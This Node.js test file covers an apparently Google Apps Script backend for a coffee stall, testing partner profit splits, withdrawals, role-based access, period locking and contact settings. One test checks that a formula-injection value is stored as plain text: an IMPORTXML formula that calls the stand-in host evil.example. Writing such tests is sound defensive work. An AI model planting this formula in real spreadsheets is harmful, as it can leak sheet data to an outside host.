const test = require('node:test');
const assert = require('node:assert/strict');
const { createRuntime } = require('./gasMock.js');

const VIVEK = 'vivek@gmail.com', AKASH = 'akash@gmail.com', ISHAN = 'ishan@gmail.com'; // Vivek is ADMIN; Akash & Ishan are PARTNERs

function freshApp() {
  const app = createRuntime();
  app.setToday('2026-10-05');
  app.setupForTests();
  const ok = (action, payload, email) => {
    const r = app.call(action, payload, email);
    if (!r.ok) throw new Error(action + ': ' + r.error);
    return r.data;
  };
  return { app, ok };
}

test('§81: public menu exposes no financial or partner data', () => {
  const { app } = freshApp();
  const r = app.call('getMenu', {});
  assert.equal(r.ok, true);
  assert.deepEqual(Object.keys(r.data[0]).sort(), ['category', 'description', 'name', 'price']);
  assert.deepEqual(r.data.map((i) => i.name).slice(0, 3), ['Clear Solution', 'Cryo Pour', 'Cold Fusion']);
  const text = JSON.stringify(r);
  for (const word of ['cogs', 'cost', 'Vivek', 'Ishan', 'ownership', 'profit']) assert.ok(!text.includes(word), word);
});

test('§81: finance actions reject anonymous, unknown and staff users server-side', () => {
  const { app, ok } = freshApp();
  assert.equal(app.call('getPartnerEarnings', {}).code, 'AUTH');
  assert.equal(app.call('getPartnerEarnings', {}, 'stranger@gmail.com').code, 'AUTH');
  ok('saveUser', { email: 'staff@gmail.com', name: 'Staff', role: 'STAFF' }, VIVEK);
  for (const a of ['getPartnerEarnings', 'getMyShare', 'getProfitReport', 'getPL', 'listWithdrawals', 'getOwnership']) {
    assert.equal(app.call(a, {}, 'staff@gmail.com').code, 'FORBIDDEN', a);
  }
  // staff can sell but never sees costs
  const cat = ok('getCatalog', {}, 'staff@gmail.com');
  assert.equal(cat.items[0].unit_cogs, undefined);
  assert.equal(cat.ingredients.length, 0);
  // partners cannot change ownership
  assert.equal(app.call('setOwnership', { effective_from: '2027-01-01', rows: [] }, ISHAN).code, 'FORBIDDEN');
});

test('end-to-end: sale → COGS snapshot → expenses → partner earnings with trace', () => {
  const { app, ok } = freshApp();
  const cat = ok('getCatalog', {}, ISHAN);
  const capp = cat.items.find((i) => i.name === 'Dark Matter');
  // seed recipe: 18g beans × ₹1.6 + shot cup ₹2 = ₹30.80
  assert.equal(capp.unit_cogs, 30.8);

  ok('openStall', { opening_cash: 500 }, ISHAN);
  const sale = ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 10 }], payment_mode: 'UPI' }, ISHAN);
  assert.equal(sale.total, 800);
  ok('addExpense', { category: 'Electricity', amount: 100, description: 'Generator' }, ISHAN);

  // A later purchase changes ingredient cost, but the recorded sale keeps its COGS snapshot.
  ok('addPurchase', { ingredient_id: 'ING_beans', qty: 1000, total_cost: 2000 }, VIVEK);
  assert.equal(ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter').unit_cogs, 38);

  const e = ok('getPartnerEarnings', { period: 'TODAY' }, VIVEK);
  assert.equal(e.business.revenue, 800);
  assert.equal(e.business.cogs, 308);
  assert.equal(e.business.other_expenses, 100);
  assert.equal(e.business.distributable_profit, 392);
  const share = Object.fromEntries(e.distribution.map((d) => [d.partner_id, d.share]));
  assert.deepEqual(share, { vivek: 78.4, akash: 78.4, ishan: 235.2 });
  assert.equal(e.total_distributed, 392);
  assert.match(e.distribution[0].trace[0], /₹392\.00 × 20% = ₹78\.40/);
  assert.match(e.disclaimer, /Estimated \/ internal/);
});

test('§77–78: withdrawals — partner can only withdraw own share, cannot exceed remaining; audited', () => {
  const { app, ok } = freshApp();
  const capp = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 100 }] }, ISHAN); // revenue 8,000, cogs 3,080 → 4,920

  let my = ok('getMyShare', {}, AKASH);
  assert.equal(my.total_earned, 984);
  assert.equal(my.status, 'PENDING');

  assert.match(app.call('recordWithdrawal', { partner_id: 'vivek', amount: 10 }, AKASH).error, /only record your own/);
  assert.match(app.call('recordWithdrawal', { partner_id: 'akash', amount: 5000 }, AKASH).error, /more than the remaining/);

  const w = ok('recordWithdrawal', { partner_id: 'akash', amount: 500, reason: 'Profit withdrawal' }, AKASH);
  assert.deepEqual([w.earned, w.paid, w.remaining, w.status], [984, 500, 484, 'PARTIALLY_PAID']);

  my = ok('getMyShare', {}, AKASH);
  assert.deepEqual([my.paid, my.remaining], [500, 484]);

  // admin may record an advance explicitly
  ok('recordWithdrawal', { partner_id: 'akash', amount: 2000, allow_advance: true }, VIVEK);
  const audit = ok('listAudit', { entity: 'PARTNER_WITHDRAWALS' }, ISHAN);
  assert.equal(audit.length, 2);
  assert.equal(audit[1].user_email, AKASH);
});

test('§79–80: ownership must total 100%, keeps history, applies per period', () => {
  const { app, ok } = freshApp();
  const bad = app.call('setOwnership', { effective_from: '2026-10-10', rows: [
    { partner_id: 'vivek', percentage: 20 }, { partner_id: 'akash', percentage: 20 }, { partner_id: 'ishan', percentage: 50 },
  ] }, VIVEK);
  assert.equal(bad.error, 'Partner ownership must total 100%.');

  const capp = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 10 }] }, ISHAN); // 5 Oct
  ok('setOwnership', { effective_from: '2026-10-06', rows: [
    { partner_id: 'vivek', percentage: 25 }, { partner_id: 'akash', percentage: 25 }, { partner_id: 'ishan', percentage: 50 },
  ] }, VIVEK);
  app.setToday('2026-10-06');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 10 }] }, ISHAN); // 6 Oct

  const own = ok('getOwnership', {}, VIVEK);
  assert.equal(own.history.length, 6);
  assert.equal(own.partners.find((p) => p.partner_id === 'vivek').ownership, 25);

  const e = ok('getPartnerEarnings', { period: 'MONTH' }, VIVEK);
  const v = e.distribution.find((d) => d.partner_id === 'vivek');
  // each day: 800 − 308 = 492 → 20% = 98.40, then 25% = 123
  assert.equal(v.ownership, '20% → 25%');
  assert.equal(v.trace.length, 2);
  assert.equal(e.total_distributed, 984);
  assert.equal(v.share, 221.4);

  const audit = ok('listAudit', { entity: 'PARTNER_OWNERSHIP_HISTORY' }, VIVEK);
  assert.ok(audit.some((a) => a.action === 'CHANGE_OWNERSHIP'));
});

test('§86: only partner-agreed expense categories reduce distributable profit', () => {
  const { ok } = freshApp();
  ok('addExpense', { category: 'Marketing', amount: 300 }, VIVEK);
  ok('setExpenseRules', { categories: ['Electricity', 'Marketing'], distributable: ['Electricity'] }, VIVEK);
  const pl = ok('getPL', { period: 'TODAY' }, VIVEK);
  assert.equal(pl.other_expenses, 0);
  assert.equal(pl.non_distributable_expenses, 300);
  assert.match(pl.formula, /Electricity/);
});

test('§85: profit report rows with FIFO paid/remaining/status and partner/status filters', () => {
  const { app, ok } = freshApp();
  const capp = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 100 }] }, ISHAN);
  ok('recordWithdrawal', { partner_id: 'vivek', amount: 984 }, VIVEK);
  app.setToday('2026-11-03');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 100 }] }, ISHAN);

  const rep = ok('getProfitReport', { period: 'CUSTOM', from: '2026-10-01', to: '2026-11-03', group_by: 'month', partner_id: 'vivek' }, AKASH);
  assert.deepEqual(rep.rows.map((r) => [r.period, r.share, r.paid, r.remaining, r.status]), [
    ['2026-10', 984, 984, 0, 'PAID'],
    ['2026-11', 984, 0, 984, 'PENDING'],
  ]);
  const pending = ok('getProfitReport', { period: 'ALL', status: 'PENDING' }, AKASH);
  assert.ok(pending.rows.every((r) => r.status === 'PENDING'));
});

test('closing a period snapshots PARTNER_DISTRIBUTIONS and blocks back-dated ownership changes', () => {
  const { app, ok } = freshApp();
  const capp = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 10 }] }, ISHAN);
  app.setToday('2026-11-02');
  const snap = ok('closePeriod', { from: '2026-10-01', to: '2026-10-31' }, VIVEK);
  assert.equal(snap.length, 3);
  assert.equal(snap.find((s) => s.partner_id === 'ishan').calculated_share, 295.2);
  assert.match(app.call('closePeriod', { from: '2026-10-15', to: '2026-10-20' }, VIVEK).error, /overlaps/);
  assert.match(app.call('setOwnership', { effective_from: '2026-10-20', rows: [{ partner_id: 'ishan', percentage: 100 }] }, VIVEK).error, /already closed/);
  const list = ok('listDistributions', {}, VIVEK);
  assert.equal(list.length, 3);
  assert.equal(list[0].live_status, 'PENDING');
});

test('user text that looks like a spreadsheet formula is stored as plain text', () => {
  const { app, ok } = freshApp();
  ok('addExpense', { category: 'Other', amount: 10, description: '=IMPORTXML("http://evil.example","//a")' }, VIVEK);
  const raw = app.ss.getSheetByName('EXPENSES').rows[1];
  assert.ok(raw.some((v) => v === '\'=IMPORTXML("http://evil.example","//a")'));
  const listed = ok('listExpenses', { period: 'TODAY' }, VIVEK).rows[0];
  assert.equal(listed.description, '=IMPORTXML("http://evil.example","//a")');
});

test('input limits: oversized orders, non-numeric amounts and long daily reports are rejected', () => {
  const { app, ok } = freshApp();
  const item = ok('getCatalog', {}, VIVEK).items[0];
  assert.match(app.call('recordSale', { lines: Array(51).fill({ item_id: item.item_id, qty: 1 }) }, VIVEK).error, /Too many lines/);
  assert.match(app.call('recordWithdrawal', { partner_id: 'vivek', amount: '' }, VIVEK).error, /must be a number/);
  assert.match(app.call('addExpense', { category: 'Other', amount: 1e12 }, VIVEK).error, /too large/);
  assert.match(app.call('getProfitReport', { period: 'CUSTOM', from: '2026-01-01', to: '2026-10-05', group_by: 'day' }, VIVEK).error, /about 3 months/);
});

test('production setupSheets refuses placeholder emails', () => {
  const app = createRuntime();
  assert.throws(() => app.setupSheets(), /CHANGE_ME/);
});

test('junk tokens are rejected locally without calling Google, and failures are cached', () => {
  const app = createRuntime();
  app.setupForTests();
  let fetches = 0;
  const orig = app.UrlFetchApp.fetch;
  app.UrlFetchApp.fetch = (u) => { fetches++; return orig(u); };
  const send = (idToken) => JSON.parse(app.doPost({ postData: { contents: JSON.stringify({ action: 'getPL', idToken }) } }).getContent());
  assert.equal(send('garbage').code, 'AUTH');
  assert.equal(send('a.b.c').code, 'AUTH');
  assert.equal(fetches, 0);
});

test('staff only see today and never revenue; partners cannot push fake purchase prices', () => {
  const { app, ok } = freshApp();
  ok('saveUser', { email: 'staff@gmail.com', name: 'Staff', role: 'STAFF' }, VIVEK);
  const item = ok('getCatalog', {}, 'staff@gmail.com').items[0];
  ok('recordSale', { lines: [{ item_id: item.item_id, qty: 2 }] }, 'staff@gmail.com');
  const s = ok('listSales', { period: 'ALL' }, 'staff@gmail.com');
  assert.equal(s.totals.revenue, undefined);
  assert.equal(s.range.from, '2026-10-05');
  // beans cost ₹1.6/g; a partner claiming ₹0.0001/g is blocked, admin can override
  assert.match(app.call('addPurchase', { ingredient_id: 'ING_beans', qty: 1e6, total_cost: 100 }, AKASH).error, /more than 50%/);
  ok('addPurchase', { ingredient_id: 'ING_beans', qty: 1000, total_cost: 1700 }, AKASH);
});

test('closed periods are locked: no back-dated expenses, voids or ownership changes', () => {
  const { app, ok } = freshApp();
  app.setToday('2026-11-02');
  ok('closePeriod', { from: '2026-10-01', to: '2026-10-31' }, VIVEK);
  assert.match(app.call('addExpense', { category: 'Other', amount: 50, date: '2026-10-15' }, VIVEK).error, /closed/);
  assert.match(app.call('setOwnership', { effective_from: '2026-11-01', rows: [
    { partner_id: 'vivek', percentage: 30 }, { partner_id: 'akash', percentage: 10 }, { partner_id: 'ishan', percentage: 60 }] }, VIVEK).error, /in the past/);
});

test('admin can void a wrong withdrawal; it stops counting as paid and is audited', () => {
  const { ok } = freshApp();
  const item = ok('getCatalog', {}, VIVEK).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: item.item_id, qty: 100 }] }, ISHAN);
  const w = ok('recordWithdrawal', { partner_id: 'ishan', amount: 1000 }, ISHAN);
  assert.equal(ok('getMyShare', {}, ISHAN).paid, 1000);
  ok('voidWithdrawal', { withdrawal_id: w.withdrawal.withdrawal_id, reason: 'Entered twice' }, VIVEK);
  assert.equal(ok('getMyShare', {}, ISHAN).paid, 0);
  assert.ok(ok('listAudit', { entity: 'PARTNER_WITHDRAWALS' }, VIVEK).some((a) => a.action === 'VOID_WITHDRAWAL'));
});

test('stall location + contact: partners set them, customers read them publicly (no names/emails/money)', () => {
  const { app, ok } = freshApp();
  // public info starts empty
  assert.deepEqual(app.call('getPublicInfo', {}).data.location, null);
  // Ishan (partner) sets location in one tap and his numbers
  ok('setStallLocation', { lat: 23.0225051, lng: 72.5713621, accuracy: 12, label: 'Near Law Garden' }, ISHAN);
  ok('setContact', { phone: '98250 12345', whatsapp: '+91 98250-12345', delivery_enabled: true, delivery_note: 'Porter across Ahmedabad' }, ISHAN);
  const pub = app.call('getPublicInfo', {});
  assert.equal(pub.ok, true);
  assert.deepEqual(pub.data.location, { lat: 23.022505, lng: 72.571362, label: 'Near Law Garden', updated_at: pub.data.location.updated_at });
  assert.equal(pub.data.phone, '+919825012345');
  assert.equal(pub.data.whatsapp, '+919825012345');
  assert.deepEqual(pub.data.delivery, { enabled: true, note: 'Porter across Ahmedabad' });
  const text = JSON.stringify(pub);
  for (const w of ['ishan', 'Ishan', '@', 'accuracy', 'profit']) assert.ok(!text.includes(w), w);
  // cache is refreshed on change
  ok('setContact', { phone: '9000000001', whatsapp: '', delivery_enabled: false }, VIVEK);
  assert.equal(app.call('getPublicInfo', {}).data.phone, '+919000000001');
  assert.ok(ok('listAudit', { entity: 'SETTINGS' }, VIVEK).some((a) => a.action === 'SET_STALL_LOCATION'));
});

test('stall settings validation and roles', () => {
  const { app, ok } = freshApp();
  ok('saveUser', { email: 'staff@gmail.com', name: 'Staff', role: 'STAFF' }, VIVEK);
  assert.equal(app.call('setStallLocation', { lat: 23, lng: 72 }, 'staff@gmail.com').code, 'FORBIDDEN');
  assert.equal(app.call('setContact', { phone: '9825012345' }).code, 'AUTH');
  assert.match(app.call('setContact', { phone: '12345' }, ISHAN).error, /valid 10-digit/);
  assert.match(app.call('setContact', { phone: '5825012345' }, ISHAN).error, /valid 10-digit/);
  assert.match(app.call('setContact', { phone: '', whatsapp: '', delivery_enabled: true }, ISHAN).error, /before turning on Porter/);
  assert.match(app.call('setStallLocation', { lat: 123, lng: 72 }, ISHAN).error, /too large|Invalid/);
  assert.match(app.call('setStallLocation', { lat: 23, lng: 72, accuracy: 5000 }, ISHAN).error, /accuracy is too low/);
});
